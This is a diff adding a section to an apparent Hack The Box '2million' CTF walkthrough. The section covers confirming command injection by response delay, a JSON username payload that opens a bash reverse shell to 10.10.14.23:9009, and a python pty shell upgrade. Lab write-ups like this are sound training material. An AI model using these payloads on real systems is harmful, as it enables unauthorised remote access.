@@ -482,3 +482,20 @@ bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
 
 Moving to BurpSuite
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b30f9d8d-de64-45f0-ba04-be6b5f03d317)
+
+Command Injection
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/29ed97e5-d0dc-4da1-92cc-75f7545f759c)
+The response is returned after a delay of 5 seconds, hence command injection exists.
+
+Reverse Shell
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ca2d3e6-b0af-4f58-a753-861e7917f895)
+```json
+{ "username":"attacker$(bash -c 'bash -i >& /dev/tcp/10.10.14.23/9009 0>&1')"}
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ba3b4c95-4eaa-4d05-b40a-ad90c2071449)
+
+Shell Upgrade
+```shell
+www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bec35870-0a36-4190-af0f-469245a9b7c5)
